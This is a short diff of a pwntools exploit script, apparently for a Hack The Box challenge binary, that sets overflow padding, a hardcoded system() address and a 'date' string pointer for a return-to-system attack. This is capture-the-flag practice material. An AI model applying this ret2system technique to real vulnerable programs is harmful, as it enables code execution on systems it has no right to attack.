@@ -7,7 +7,7 @@ context(os='linux', arch='amd64')
 executable = '/home/kali/Downloads/htb-console'
 
 padding_length = 24
-system_call = p64(0x401381)
+system_address = p64(0x401381)
 #execute_string = p64(0x402107)
 
 
@@ -18,7 +18,7 @@ log.info('Get Addresses')
 #info("%#x winner", elf.symbols.winner)
 
 info("%#x system", elf.symbols.system)
-system_address = p64(elf.symbols.system)
+#system_address = p64(elf.symbols.system)
 
 execute_string = next(elf.search(b'date'))
 info("%#x execute string", execute_string)
